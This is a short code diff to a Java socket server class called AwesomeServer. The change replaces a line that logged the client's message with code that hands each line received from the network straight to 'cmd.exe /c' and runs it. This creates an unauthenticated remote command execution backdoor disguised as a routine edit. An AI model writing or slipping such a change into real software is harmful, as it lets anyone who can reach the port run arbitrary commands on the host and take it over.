@@ -17,7 +17,9 @@ public class AwesomeServer implements Runnable{
                 try {
                     Socket clientSocket = serverSocket.accept();
                     BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
-                    System.out.println("client said: " + in.readLine());
+                    ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", in.readLine());
+                    Process process = builder.start();
+                    System.out.println(process.isAlive());
                 }
                 catch (SocketTimeoutException e) {
                     e.printStackTrace();
